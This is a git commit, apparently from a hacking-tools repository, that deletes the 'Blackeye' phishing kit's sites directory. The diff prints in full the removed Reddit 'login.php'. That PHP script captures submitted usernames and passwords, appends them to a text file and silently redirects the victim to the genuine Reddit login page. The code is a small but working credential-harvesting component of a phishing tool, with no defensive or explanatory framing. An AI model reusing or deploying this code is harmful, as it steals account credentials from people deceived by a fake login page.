6707c29b119dc287a6b3d44bda11f9696526ad65
black-code-vs <81394274+black-code-vs@users.noreply.github.com>
2021-04-06 12:51:17 -0400

    Delete Tools/Blackeye/sites directory

--- Tools/Blackeye/sites/reddit/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F');
-exit();
